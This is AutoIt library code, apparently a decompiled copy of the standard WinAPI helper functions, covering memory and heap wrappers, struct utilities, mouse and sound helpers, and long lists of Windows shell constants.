        Local $acall = DllCall("kernel32.dll", "bool", "GlobalMemoryStatusEx", "struct*", $tmem)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $amem[0x7]
        $amem[0x0] = DllStructGetData($tmem, 0x2)
        $amem[0x1] = DllStructGetData($tmem, 0x3)
        $amem[0x2] = DllStructGetData($tmem, 0x4)
        $amem[0x3] = DllStructGetData($tmem, 0x5)
        $amem[0x4] = DllStructGetData($tmem, 0x6)
        $amem[0x5] = DllStructGetData($tmem, 0x7)
        $amem[0x6] = DllStructGetData($tmem, 0x8)
        Return $amem
    EndFunc    ; -> _WinAPI_GlobalMemoryStatus

    Func _WinAPI_IsBadCodePtr($paddress)
        Local $acall = DllCall("kernel32.dll", "bool", "IsBadCodePtr", "struct*", $paddress)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsBadCodePtr

    Func _WinAPI_IsBadReadPtr($paddress, $ilength)
        Local $acall = DllCall("kernel32.dll", "bool", "IsBadReadPtr", "struct*", $paddress, "uint_ptr", $ilength)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsBadReadPtr

    Func _WinAPI_IsBadStringPtr($paddress, $ilength)
        Local $acall = DllCall("kernel32.dll", "bool", "IsBadStringPtr", "struct*", $paddress, "uint_ptr", $ilength)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsBadStringPtr

    Func _WinAPI_IsBadWritePtr($paddress, $ilength)
        Local $acall = DllCall("kernel32.dll", "bool", "IsBadWritePtr", "struct*", $paddress, "uint_ptr", $ilength)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsBadWritePtr

    Func _WinAPI_IsMemory($pmemory)
        Local $bresult = __HeapValidate($pmemory)
        Return SetError(@error, @extended, $bresult)
    EndFunc    ; -> _WinAPI_IsMemory

    Func _WinAPI_LocalFree($hmemory)
        Local $acall = DllCall("kernel32.dll", "handle", "LocalFree", "handle", $hmemory)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LocalFree

    Func _WinAPI_MoveMemory($pdestination, $psource, $ilength)
        If _WinAPI_IsBadReadPtr($psource, $ilength) Then Return SetError(0xa, @extended, 0x0)
        If _WinAPI_IsBadWritePtr($pdestination, $ilength) Then Return SetError(0xb, @extended, 0x0)
        DllCall("ntdll.dll", "none", "RtlMoveMemory", "struct*", $pdestination, "struct*", $psource, "ulong_ptr", $ilength)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_MoveMemory

    Func _WinAPI_ReadProcessMemory($hprocess, $pbaseaddress, $pbuffer, $isize, ByRef $iread)
        Local $acall = DllCall("kernel32.dll", "bool", "ReadProcessMemory", "handle", $hprocess, "ptr", $pbaseaddress, "struct*", $pbuffer, "ulong_ptr", $isize, "ulong_ptr*", 0x0)
        If @error Then Return SetError(@error, @extended, False)
        $iread = $acall[0x5]
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ReadProcessMemory

    Func _WinAPI_WriteProcessMemory($hprocess, $pbaseaddress, $pbuffer, $isize, ByRef $iwritten, $sbuffertype = "ptr")
        Local $acall = DllCall("kernel32.dll", "bool", "WriteProcessMemory", "handle", $hprocess, "ptr", $pbaseaddress, $sbuffertype, $pbuffer, "ulong_ptr", $isize, "ulong_ptr*", 0x0)
        If @error Then Return SetError(@error, @extended, False)
        $iwritten = $acall[0x5]
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_WriteProcessMemory

    Func _WinAPI_ZeroMemory($pmemory, $ilength)
        If _WinAPI_IsBadWritePtr($pmemory, $ilength) Then Return SetError(0xb, @extended, 0x0)
        DllCall("ntdll.dll", "none", "RtlZeroMemory", "struct*", $pmemory, "ulong_ptr", $ilength)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ZeroMemory

#EndRegion Public Functions
#Region Internal Functions
    Func __HeapAlloc($isize, $babort = False)
        Local $acall
        If Not $__g_hheap Then
            $acall = DllCall("kernel32.dll", "handle", "HeapCreate", "dword", 0x0, "ulong_ptr", 0x0, "ulong_ptr", 0x0)
            If @error Or Not $acall[0x0] Then __FatalExit(0x1, "Error allocating memory.")
            $__g_hheap = $acall[0x0]
        EndIf
        $acall = DllCall("kernel32.dll", "ptr", "HeapAlloc", "handle", $__g_hheap, "dword", 0x8, "ulong_ptr", $isize)
        If @error Or Not $acall[0x0] Then
            If $babort Then __FatalExit(0x1, "Error allocating memory.")
            Return SetError(@error + 0x1e, @extended, 0x0)
        EndIf
        Return $acall[0x0]
    EndFunc    ; -> __HeapAlloc

    Func __HeapFree(ByRef $pmemory, $bcheck = False, $icurerr = @error, $icurext = @extended)
        If $bcheck And (Not __HeapValidate($pmemory)) Then Return SetError(@error, @extended, 0x0)
        Local $acall = DllCall("kernel32.dll", "int", "HeapFree", "handle", $__g_hheap, "dword", 0x0, "ptr", $pmemory)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0x28, @extended, 0x0)
        $pmemory = 0x0
        Return SetError($icurerr, $icurext, 0x1)
    EndFunc    ; -> __HeapFree

    Func __HeapReAlloc($pmemory, $isize, $bamount = False, $babort = False)
        Local $pret
        If __HeapValidate($pmemory) Then
            If $bamount And (__HeapSize($pmemory) >= $isize) Then Return SetExtended(0x1, Ptr($pmemory))
            Local $acall = DllCall("kernel32.dll", "ptr", "HeapReAlloc", "handle", $__g_hheap, "dword", 0x8, "ptr", $pmemory, "ulong_ptr", $isize)
            If @error Or Not $acall[0x0] Then
                If $babort Then __FatalExit(0x1, "Error allocating memory.")
                Return SetError(@error + 0x14, @extended, Ptr($pmemory))
            EndIf
            $pret = $acall[0x0]
        Else
            $pret = __HeapAlloc($isize, $babort)
            If @error Then Return SetError(@error, @extended, 0x0)
        EndIf
        Return $pret
    EndFunc    ; -> __HeapReAlloc

    Func __HeapSize($pmemory, $bcheck = False)
        If $bcheck And (Not __HeapValidate($pmemory)) Then Return SetError(@error, @extended, 0x0)
        Local $acall = DllCall("kernel32.dll", "ulong_ptr", "HeapSize", "handle", $__g_hheap, "dword", 0x0, "ptr", $pmemory)
        If @error Or ($acall[0x0] = Ptr(+ -1)) Then Return SetError(@error + 0x32, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> __HeapSize

    Func __HeapValidate($pmemory)
        If (Not $__g_hheap) Or (Not Ptr($pmemory)) Then Return SetError(0x9, 0x0, False)
        Local $acall = DllCall("kernel32.dll", "int", "HeapValidate", "handle", $__g_hheap, "dword", 0x0, "ptr", $pmemory)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> __HeapValidate

#EndRegion Internal Functions
Global Const $SND_APPLICATION = 0x80
Global Const $SND_ALIAS = 0x10000
Global Const $SND_ALIAS_ID = 0x110000
Global Const $SND_ASYNC = 0x1
Global Const $SND_FILENAME = 0x20000
Global Const $SND_LOOP = 0x8
Global Const $SND_MEMORY = 0x4
Global Const $SND_NODEFAULT = 0x2
Global Const $SND_NOSTOP = 0x10
Global Const $SND_NOWAIT = 0x2000
Global Const $SND_PURGE = 0x40
Global Const $SND_RESOURCE = 0x40004
Global Const $SND_SENTRY = 0x80000
Global Const $SND_SYNC = 0x0
Global Const $SND_SYSTEM = 0x200000
Global Const $SND_SYSTEM_NOSTOP = 0x200010
Global Const $SND_ALIAS_SYSTEMASTERISK = "SystemAsterisk"
Global Const $SND_ALIAS_SYSTEMDEFAULT = "SystemDefault"
Global Const $SND_ALIAS_SYSTEMEXCLAMATION = "SystemExclamation"
Global Const $SND_ALIAS_SYSTEMEXIT = "SystemExit"
Global Const $SND_ALIAS_SYSTEMHAND = "SystemHand"
Global Const $SND_ALIAS_SYSTEMQUESTION = "SystemQuestion"
Global Const $SND_ALIAS_SYSTEMSTART = "SystemStart"
Global Const $SND_ALIAS_SYSTEMWELCOME = "SystemWelcome"
#Region Global Variables and Constants
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_ArrayToStruct(Const ByRef $ADATA, $ISTART = 0x0, $IEND = + -1)
        If __CheckErrorArrayBounds($ADATA, $ISTART, $IEND) Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $tagstruct = ''
        For $i = $ISTART To $IEND
            $tagstruct &= "wchar[" & (StringLen($ADATA[$i]) + 0x1) & "];"
        Next
        Local $tdata = DllStructCreate($tagstruct & "wchar[1]")
        Local $icount = 0x1
        For $i = $ISTART To $IEND
            DllStructSetData($tdata, $icount, $ADATA[$i])
            $icount += 0x1
        Next
        DllStructSetData($tdata, $icount, ChrW(0x0))
        Return $tdata
    EndFunc    ; -> _WinAPI_ArrayToStruct

    Func _WinAPI_CreateMargins($ileftwidth, $irightwidth, $itopheight, $ibottomheight)
        Local $tmargins = DllStructCreate($TAGMARGINS)
        DllStructSetData($tmargins, 0x1, $ileftwidth)
        DllStructSetData($tmargins, 0x2, $irightwidth)
        DllStructSetData($tmargins, 0x3, $itopheight)
        DllStructSetData($tmargins, 0x4, $ibottomheight)
        Return $tmargins
    EndFunc    ; -> _WinAPI_CreateMargins

    Func _WinAPI_CreatePoint($ix, $iy)
        Local $tpoint = DllStructCreate($TAGPOINT)
        DllStructSetData($tpoint, 0x1, $ix)
        DllStructSetData($tpoint, 0x2, $iy)
        Return $tpoint
    EndFunc    ; -> _WinAPI_CreatePoint

    Func _WinAPI_CreateRect($ileft, $itop, $iright, $ibottom)
        Local $trect = DllStructCreate($TAGRECT)
        DllStructSetData($trect, 0x1, $ileft)
        DllStructSetData($trect, 0x2, $itop)
        DllStructSetData($trect, 0x3, $iright)
        DllStructSetData($trect, 0x4, $ibottom)
        Return $trect
    EndFunc    ; -> _WinAPI_CreateRect

    Func _WinAPI_CreateRectEx($ix, $iy, $iwidth, $iheight)
        Local $trect = DllStructCreate($TAGRECT)
        DllStructSetData($trect, 0x1, $ix)
        DllStructSetData($trect, 0x2, $iy)
        DllStructSetData($trect, 0x3, $ix + $iwidth)
        DllStructSetData($trect, 0x4, $iy + $iheight)
        Return $trect
    EndFunc    ; -> _WinAPI_CreateRectEx

    Func _WinAPI_CreateSize($iwidth, $iheight)
        Local $tsize = DllStructCreate($TAGSIZE)
        DllStructSetData($tsize, 0x1, $iwidth)
        DllStructSetData($tsize, 0x2, $iheight)
        Return $tsize
    EndFunc    ; -> _WinAPI_CreateSize

    Func _WinAPI_CopyStruct($tstruct, $sstruct = '')
        Local $isize = DllStructGetSize($tstruct)
        If Not $isize Then Return SetError(0x1, 0x0, 0x0)
        Local $tresult
        If Not StringStripWS($sstruct, $STR_STRIPLEADING + $STR_STRIPTRAILING + $STR_STRIPSPACES) Then
            $tresult = DllStructCreate("byte[" & $isize & "]")
        Else
            $tresult = DllStructCreate($sstruct)
        EndIf
        If DllStructGetSize($tresult) < $isize Then Return SetError(0x2, 0x0, 0x0)
        _WinAPI_MoveMemory($tresult, $tstruct, $isize)
        Return $tresult
    EndFunc    ; -> _WinAPI_CopyStruct

    Func _WinAPI_GetExtended()
        Return $__g_vext
    EndFunc    ; -> _WinAPI_GetExtended

    Func _WinAPI_GetMousePos($btoclient = False, $hwnd = 0x0)
        Local $imode = Opt("MouseCoordMode", 0x1)
        Local $apos = MouseGetPos()
        Opt("MouseCoordMode", $imode)
        Local $tpoint = DllStructCreate($TAGPOINT)
        DllStructSetData($tpoint, "X", $apos[0x0])
        DllStructSetData($tpoint, "Y", $apos[0x1])
        If $btoclient And Not _WinAPI_ScreenToClient($hwnd, $tpoint) Then Return SetError(@error + 0x14, @extended, 0x0)
        Return $tpoint
    EndFunc    ; -> _WinAPI_GetMousePos

    Func _WinAPI_GetMousePosX($btoclient = False, $hwnd = 0x0)
        Local $tpoint = _WinAPI_GetMousePos($btoclient, $hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return DllStructGetData($tpoint, "X")
    EndFunc    ; -> _WinAPI_GetMousePosX

    Func _WinAPI_GetMousePosY($btoclient = False, $hwnd = 0x0)
        Local $tpoint = _WinAPI_GetMousePos($btoclient, $hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return DllStructGetData($tpoint, "Y")
    EndFunc    ; -> _WinAPI_GetMousePosY

    Func _WinAPI_MulDiv($inumber, $inumerator, $idenominator)
        Local $acall = DllCall("kernel32.dll", "int", "MulDiv", "int", $inumber, "int", $inumerator, "int", $idenominator)
        If @error Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_MulDiv

    Func _WinAPI_PlaySound($ssound, $iflags = $SND_SYSTEM_NOSTOP, $hinstance = 0x0)
        Local $stypeofsound = "ptr"
        If $ssound Then
            If IsString($ssound) Then
                $stypeofsound = "wstr"
            EndIf
        Else
            $ssound = 0x0
            $iflags = 0x0
        EndIf
        Local $acall = DllCall("winmm.dll", "bool", "PlaySoundW", $stypeofsound, $ssound, "handle", $hinstance, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PlaySound

    Func _WinAPI_StringLenA(Const ByRef $tstring)
        Local $acall = DllCall("kernel32.dll", "int", "lstrlenA", "struct*", $tstring)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_StringLenA

    Func _WinAPI_StringLenW(Const ByRef $tstring)
        Local $acall = DllCall("kernel32.dll", "int", "lstrlenW", "struct*", $tstring)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_StringLenW

    Func _WinAPI_StructToArray(ByRef $tstruct, $iitems = 0x0)
        Local $isize = 0x2 * Floor(DllStructGetSize($tstruct) / 0x2)
        Local $pstruct = DllStructGetPtr($tstruct)
        If Not $isize Or Not $pstruct Then Return SetError(0x1, 0x0, 0x0)
        Local $tdata, $ilength, $ioffset = 0x0
        Local $aret[0x65] = [0x0]
        While 0x1
            $ilength = _WinAPI_StrLen($pstruct + $ioffset)
            If Not $ilength Then
                ExitLoop
            EndIf
            If 0x2 * (0x1 + $ilength) + $ioffset > $isize Then Return SetError(0x3, 0x0, 0x0)
            $tdata = DllStructCreate("wchar[" & (0x1 + $ilength) & "]", $pstruct + $ioffset)
            If @error Then Return SetError(@error + 0xa, 0x0, 0x0)
            __Inc($aret)
            $aret[$aret[0x0]] = DllStructGetData($tdata, 0x1)
            If $aret[0x0] = $iitems Then
                ExitLoop
            EndIf
            $ioffset += 0x2 * (0x1 + $ilength)
            If $ioffset >= $isize Then Return SetError(0x3, 0x0, 0x0)
        WEnd
        If Not $aret[0x0] Then Return SetError(0x2, 0x0, 0x0)
        __Inc($aret, + -1)
        Return $aret
    EndFunc    ; -> _WinAPI_StructToArray

    Func _WinAPI_UnionStruct($tstruct1, $tstruct2, $sstruct = '')
        Local $asize[0x2] = [DllStructGetSize($tstruct1), DllStructGetSize($tstruct2)]
        If Not $asize[0x0] Or Not $asize[0x1] Then Return SetError(0x1, 0x0, 0x0)
        Local $tresult
        If Not StringStripWS($sstruct, $STR_STRIPLEADING + $STR_STRIPTRAILING + $STR_STRIPSPACES) Then
            $tresult = DllStructCreate("byte[" & ($asize[0x0] + $asize[0x1]) & "]")
        Else
            $tresult = DllStructCreate($sstruct)
        EndIf
        If DllStructGetSize($tresult) < ($asize[0x0] + $asize[0x1]) Then Return SetError(0x2, 0x0, 0x0)
        _WinAPI_MoveMemory($tresult, $tstruct1, $asize[0x0])
        _WinAPI_MoveMemory(DllStructGetPtr($tresult) + $asize[0x0], $tstruct2, $asize[0x1])
        Return $tresult
    EndFunc    ; -> _WinAPI_UnionStruct

#EndRegion Public Functions
Global Const $DLLVER_PLATFORM_WINDOWS = 0x1
Global Const $DLLVER_PLATFORM_NT = 0x2
Global Const $SHCNE_ALLEVENTS = 0x7fffffff
Global Const $SHCNE_ASSOCCHANGED = 0x8000000
Global Const $SHCNE_ATTRIBUTES = 0x800
Global Const $SHCNE_CREATE = 0x2
Global Const $SHCNE_DELETE = 0x4
Global Const $SHCNE_DRIVEADD = 0x100
Global Const $SHCNE_DRIVEADDGUI = 0x10000
Global Const $SHCNE_DRIVEREMOVED = 0x80
Global Const $SHCNE_EXTENDED_EVENT = 0x4000000
Global Const $SHCNE_FREESPACE = 0x40000
Global Const $SHCNE_MEDIAINSERTED = 0x20
Global Const $SHCNE_MEDIAREMOVED = 0x40
Global Const $SHCNE_MKDIR = 0x8
Global Const $SHCNE_NETSHARE = 0x200
Global Const $SHCNE_NETUNSHARE = 0x400
Global Const $SHCNE_RENAMEFOLDER = 0x20000
Global Const $SHCNE_RENAMEITEM = 0x1
Global Const $SHCNE_RMDIR = 0x10
Global Const $SHCNE_SERVERDISCONNECT = 0x4000
Global Const $SHCNE_UPDATEDIR = 0x1000
Global Const $SHCNE_UPDATEIMAGE = 0x8000
Global Const $SHCNE_UPDATEITEM = 0x2000
Global Const $SHCNE_DISKEVENTS = 0x2381f
Global Const $SHCNE_GLOBALEVENTS = 0xc0581e0
Global Const $SHCNE_INTERRUPT = -2147483648
Global Const $SHCNF_DWORD = 0x3
Global Const $SHCNF_IDLIST = 0x0
Global Const $SHCNF_PATH = 0x1
Global Const $SHCNF_PRINTER = 0x2
Global Const $SHCNF_FLUSH = 0x1000
Global Const $SHCNF_FLUSHNOWAIT = 0x2000
Global Const $SHCNF_NOTIFYRECURSIVE = 0x10000
Global Const $SHCNRF_INTERRUPTLEVEL = 0x1
Global Const $SHCNRF_SHELLLEVEL = 0x2
Global Const $SHCNRF_RECURSIVEINTERRUPT = 0x1000
Global Const $SHCNRF_NEWDELIVERY = 0x8000
Global Const $SHERB_NOCONFIRMATION = 0x1
Global Const $SHERB_NOPROGRESSUI = 0x2
Global Const $SHERB_NOSOUND = 0x4
Global Const $SHERB_NO_UI = BitOR($SHERB_NOCONFIRMATION, $SHERB_NOPROGRESSUI, $SHERB_NOSOUND)
Global Const $SEE_MASK_DEFAULT = 0x0
Global Const $SEE_MASK_CLASSNAME = 0x1
Global Const $SEE_MASK_CLASSKEY = 0x3
Global Const $SEE_MASK_IDLIST = 0x4
Global Const $SEE_MASK_INVOKEIDLIST = 0xc
Global Const $SEE_MASK_ICON = 0x10
Global Const $SEE_MASK_HOTKEY = 0x20
Global Const $SEE_MASK_NOCLOSEPROCESS = 0x40
Global Const $SEE_MASK_CONNECTNETDRV = 0x80
Global Const $SEE_MASK_NOASYNC = 0x100
Global Const $SEE_MASK_FLAG_DDEWAIT = $SEE_MASK_NOASYNC
Global Const $SEE_MASK_DOENVSUBST = 0x200
Global Const $SEE_MASK_FLAG_NO_UI = 0x400
Global Const $SEE_MASK_UNICODE = 0x4000
Global Const $SEE_MASK_NO_CONSOLE = 0x8000
Global Const $SEE_MASK_ASYNCOK = 0x100000
Global Const $SEE_MASK_NOQUERYCLASSSTORE = 0x1000000
Global Const $SEE_MASK_HMONITOR = 0x200000
Global Const $SEE_MASK_NOZONECHECKS = 0x800000
Global Const $SEE_MASK_WAITFORINPUTIDLE = 0x2000000
Global Const $SEE_MASK_FLAG_LOG_USAGE = 0x4000000
Global Const $SE_ERR_ACCESSDENIED = 0x5
Global Const $SE_ERR_ASSOCINCOMPLETE = 0x1b
Global Const $SE_ERR_DDEBUSY = 0x1e
Global Const $SE_ERR_DDEFAIL = 0x1d
Global Const $SE_ERR_DDETIMEOUT = 0x1c
Global Const $SE_ERR_DLLNOTFOUND = 0x20
Global Const $SE_ERR_FNF = 0x2
Global Const $SE_ERR_NOASSOC = 0x1f
Global Const $SE_ERR_OOM = 0x8
Global Const $SE_ERR_PNF = 0x3
Global Const $SE_ERR_SHARE = 0x1a
Global Const $FO_COPY = 0x2
Global Const $FO_DELETE = 0x3
Global Const $FO_MOVE = 0x1
Global Const $FO_RENAME = 0x4
Global Const $FOF_ALLOWUNDO = 0x40
Global Const $FOF_CONFIRMMOUSE = 0x2
Global Const $FOF_FILESONLY = 0x80
Global Const $FOF_MULTIDESTFILES = 0x1
Global Const $FOF_NOCONFIRMATION = 0x10
Global Const $FOF_NOCONFIRMMKDIR = 0x200
Global Const $FOF_NO_CONNECTED_ELEMENTS = 0x2000
Global Const $FOF_NOCOPYSECURITYATTRIBS = 0x800
Global Const $FOF_NOERRORUI = 0x400
Global Const $FOF_NORECURSEREPARSE = 0x8000
Global Const $FOF_NORECURSION = 0x1000
Global Const $FOF_RENAMEONCOLLISION = 0x8
Global Const $FOF_SILENT = 0x4
Global Const $FOF_SIMPLEPROGRESS = 0x100
Global Const $FOF_WANTMAPPINGHANDLE = 0x20
Global Const $FOF_WANTNUKEWARNING = 0x4000
Global Const $FOF_NO_UI = BitOR($FOF_NOCONFIRMATION, $FOF_NOCONFIRMMKDIR, $FOF_NOERRORUI, $FOF_SILENT)
Global Const $SHGFI_ADDOVERLAYS = 0x20
Global Const $SHGFI_ATTR_SPECIFIED = 0x20000
Global Const $SHGFI_ATTRIBUTES = 0x800
Global Const $SHGFI_DISPLAYNAME = 0x200
Global Const $SHGFI_EXETYPE = 0x2000
Global Const $SHGFI_ICON = 0x100
Global Const $SHGFI_ICONLOCATION = 0x1000
Global Const $SHGFI_LARGEICON = 0x0
Global Const $SHGFI_LINKOVERLAY = 0x8000
Global Const $SHGFI_OPENICON = 0x2
Global Const $SHGFI_OVERLAYINDEX = 0x40
Global Const $SHGFI_PIDL = 0x8
Global Const $SHGFI_SELECTED = 0x10000
Global Const $SHGFI_SHELLICONSIZE = 0x4
Global Const $SHGFI_SMALLICON = 0x1
Global Const $SHGFI_SYSICONINDEX = 0x4000
Global Const $SHGFI_TYPENAME = 0x400
Global Const $SHGFI_USEFILEATTRIBUTES = 0x10
Global Const $SFGAO_CANCOPY = 0x1
Global Const $SFGAO_CANMOVE = 0x2
Global Const $SFGAO_CANLINK = 0x4
Global Const $SFGAO_STORAGE = 0x8
Global Const $SFGAO_CANRENAME = 0x10
Global Const $SFGAO_CANDELETE = 0x20
Global Const $SFGAO_HASPROPSHEET = 0x40
Global Const $SFGAO_DROPTARGET = 0x100
Global Const $SFGAO_CAPABILITYMASK = BitOR($SFGAO_CANCOPY, $SFGAO_CANMOVE, $SFGAO_CANLINK, $SFGAO_CANRENAME, $SFGAO_CANDELETE, $SFGAO_HASPROPSHEET, $SFGAO_DROPTARGET)
Global Const $SFGAO_SYSTEM = 0x1000
Global Const $SFGAO_ENCRYPTED = 0x2000
Global Const $SFGAO_ISSLOW = 0x4000
Global Const $SFGAO_GHOSTED = 0x8000
Global Const $SFGAO_LINK = 0x10000
Global Const $SFGAO_SHARE = 0x20000
Global Const $SFGAO_READONLY = 0x40000
Global Const $SFGAO_HIDDEN = 0x80000
Global Const $SFGAO_DISPLAYATTRMASK = BitOR($SFGAO_ISSLOW, $SFGAO_GHOSTED, $SFGAO_LINK, $SFGAO_SHARE, $SFGAO_READONLY, $SFGAO_HIDDEN)
Global Const $SFGAO_NONENUMERATED = 0x100000
Global Const $SFGAO_NEWCONTENT = 0x200000
Global Const $SFGAO_STREAM = 0x400000
Global Const $SFGAO_STORAGEANCESTOR = 0x800000
Global Const $SFGAO_VALIDATE = 0x1000000
Global Const $SFGAO_REMOVABLE = 0x2000000
Global Const $SFGAO_COMPRESSED = 0x4000000
Global Const $SFGAO_BROWSABLE = 0x8000000
Global Const $SFGAO_FILESYSANCESTOR = 0x10000000
Global Const $SFGAO_FOLDER = 0x20000000
Global Const $SFGAO_FILESYSTEM = 0x40000000
Global Const $SFGAO_STORAGECAPMASK = BitOR($SFGAO_STORAGE, $SFGAO_LINK, $SFGAO_READONLY, $SFGAO_STREAM, $SFGAO_STORAGEANCESTOR, $SFGAO_FILESYSANCESTOR, $SFGAO_FOLDER, $SFGAO_FILESYSTEM)
Global Const $SFGAO_HASSUBFOLDER = -2147483648
Global Const $SFGAO_CONTENTSMASK = $SFGAO_HASSUBFOLDER
Global Const $SFGAO_PKEYSFGAOMASK = BitOR($SFGAO_ISSLOW, $SFGAO_READONLY, $SFGAO_HASSUBFOLDER, $SFGAO_VALIDATE)
Global Const $IDO_SHGIOI_DEFAULT = 0xffffffc
Global Const $IDO_SHGIOI_LINK = 0xffffffe
Global Const $IDO_SHGIOI_SHARE = 0xfffffff
Global Const $IDO_SHGIOI_SLOWFILE = 0xffffffd
Global Const $FCSM_VIEWID = 0x1
Global Const $FCSM_WEBVIEWTEMPLATE = 0x2
Global Const $FCSM_INFOTIP = 0x4
Global Const $FCSM_CLSID = 0x8
Global Const $FCSM_ICONFILE = 0x10
Global Const $FCSM_LOGO = 0x20
Global Const $FCSM_FLAGS = 0x40
Global Const $FCS_READ = 0x1
Global Const $FCS_FORCEWRITE = 0x2
Global Const $FCS_WRITE = BitOR($FCS_READ, $FCS_FORCEWRITE)
Global Const $SSF_AUTOCHECKSELECT = 0x800000
Global Const $SSF_DESKTOPHTML = 0x200
Global Const $SSF_DONTPRETTYPATH = 0x800
Global Const $SSF_DOUBLECLICKINWEBVIEW = 0x80
Global Const $SSF_HIDEICONS = 0x4000
Global Const $SSF_ICONSONLY = 0x1000000
Global Const $SSF_MAPNETDRVBUTTON = 0x1000
Global Const $SSF_NOCONFIRMRECYCLE = 0x8000
Global Const $SSF_NONETCRAWLING = 0x100000
Global Const $SSF_SEPPROCESS = 0x80000
Global Const $SSF_SHOWALLOBJECTS = 0x1
Global Const $SSF_SHOWCOMPCOLOR = 0x8
Global Const $SSF_SHOWEXTENSIONS = 0x2
Global Const $SSF_SHOWINFOTIP = 0x2000
Global Const $SSF_SHOWSUPERHIDDEN = 0x40000
Global Const $SSF_SHOWSYSFILES = 0x20
Global Const $SSF_SHOWTYPEOVERLAY = 0x2000000
Global Const $SSF_STARTPANELON = 0x200000
Global Const $SSF_WIN95CLASSIC = 0x400
Global Const $SSF_WEBVIEW = 0x20000
Global Const $CSIDL_ADMINTOOLS = 0x30
Global Const $CSIDL_ALTSTARTUP = 0x1d
Global Const $CSIDL_APPDATA = 0x1a
Global Const $CSIDL_BITBUCKET = 0xa
Global Const $CSIDL_CDBURN_AREA = 0x3b
Global Const $CSIDL_COMMON_ADMINTOOLS = 0x2f
Global Const $CSIDL_COMMON_ALTSTARTUP = 0x1e
Global Const $CSIDL_COMMON_APPDATA = 0x23
Global Const $CSIDL_COMMON_DESKTOPDIRECTORY = 0x19
Global Const $CSIDL_COMMON_DOCUMENTS = 0x2e
Global Const $CSIDL_COMMON_FAVORITES = 0x1f
Global Const $CSIDL_COMMON_MUSIC = 0x35
Global Const $CSIDL_COMMON_PICTURES = 0x36
Global Const $CSIDL_COMMON_PROGRAMS = 0x17
Global Const $CSIDL_COMMON_STARTMENU = 0x16
Global Const $CSIDL_COMMON_STARTUP = 0x18
Global Const $CSIDL_COMMON_TEMPLATES = 0x2d
Global Const $CSIDL_COMMON_VIDEO = 0x37
Global Const $CSIDL_COMPUTERSNEARME = 0x3d
Global Const $CSIDL_CONNECTIONS = 0x31
Global Const $CSIDL_CONTROLS = 0x3
Global Const $CSIDL_COOKIES = 0x21
Global Const $CSIDL_DESKTOP = 0x0
Global Const $CSIDL_DESKTOPDIRECTORY = 0x10
Global Const $CSIDL_DRIVES = 0x11
Global Const $CSIDL_FAVORITES = 0x6
Global Const $CSIDL_FONTS = 0x14
Global Const $CSIDL_INTERNET_CACHE = 0x20
Global Const $CSIDL_HISTORY = 0x22
Global Const $CSIDL_LOCAL_APPDATA = 0x1c
Global Const $CSIDL_MYMUSIC = 0xd
Global Const $CSIDL_MYPICTURES = 0x27
Global Const $CSIDL_MYVIDEO = 0xe
Global Const $CSIDL_NETHOOD = 0x13
Global Const $CSIDL_PERSONAL = 0x5
Global Const $CSIDL_PRINTERS = 0x4
Global Const $CSIDL_PRINTHOOD = 0x1b
Global Const $CSIDL_PROFILE = 0x28
Global Const $CSIDL_PROGRAM_FILES = 0x26
Global Const $CSIDL_PROGRAM_FILES_COMMON = 0x2b
Global Const $CSIDL_PROGRAM_FILES_COMMONX86 = 0x2c
Global Const $CSIDL_PROGRAM_FILESX86 = 0x2a
Global Const $CSIDL_PROGRAMS = 0x2
Global Const $CSIDL_RECENT = 0x8
Global Const $CSIDL_SENDTO = 0x9
Global Const $CSIDL_STARTMENU = 0xb
Global Const $CSIDL_STARTUP = 0x7
Global Const $CSIDL_SYSTEM = 0x25
Global Const $CSIDL_SYSTEMX86 = 0x29
Global Const $CSIDL_TEMPLATES = 0x15
Global Const $CSIDL_WINDOWS = 0x24
Global Const $SIID_DOCNOASSOC = 0x0
Global Const $SIID_DOCASSOC = 0x1
Global Const $SIID_APPLICATION = 0x2
Global Const $SIID_FOLDER = 0x3
Global Const $SIID_FOLDEROPEN = 0x4
Global Const $SIID_DRIVE525 = 0x5
Global Const $SIID_DRIVE35 = 0x6
Global Const $SIID_DRIVEREMOVE = 0x7
Global Const $SIID_DRIVEFIXED = 0x8
Global Const $SIID_DRIVENET = 0x9
Global Const $SIID_DRIVENETDISABLED = 0xa
Global Const $SIID_DRIVECD = 0xb
Global Const $SIID_DRIVERAM = 0xc
Global Const $SIID_WORLD = 0xd
Global Const $SIID_SERVER = 0xf
Global Const $SIID_PRINTER = 0x10
Global Const $SIID_MYNETWORK = 0x11
Global Const $SIID_FIND = 0x16
Global Const $SIID_HELP = 0x17
Global Const $SIID_SHARE = 0x1c
Global Const $SIID_LINK = 0x1d
Global Const $SIID_SLOWFILE = 0x1e
Global Const $SIID_RECYCLER = 0x1f
Global Const $SIID_RECYCLERFULL = 0x20
Global Const $SIID_MEDIACDAUDIO = 0x28
